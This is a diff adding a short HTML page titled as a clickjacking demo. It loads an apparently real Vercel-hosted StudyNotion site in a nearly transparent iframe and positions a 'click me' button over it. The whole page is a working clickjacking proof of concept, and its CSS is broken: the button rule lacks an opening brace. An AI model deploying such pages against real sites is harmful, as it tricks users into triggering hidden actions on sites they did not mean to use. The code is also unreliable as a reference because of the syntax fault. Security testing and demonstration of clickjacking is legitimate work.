@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clickjacking</title>
+</head>
+<style>
+    iframe{
+        opacity: 0.1;
+    }
+    button	        position: absolute;
+        top: 485px;
+        left: 175px;
+    }
+</style>
+<body>
+    <h2>Clickjacking Demo Page (iframe)</h2><br/>
+    <iframe src="https://study-notion-frontend-wheat.vercel.app/" height="500px" width="500px"></iframe>
+    <button>click me </button>
+</body>
+</html>
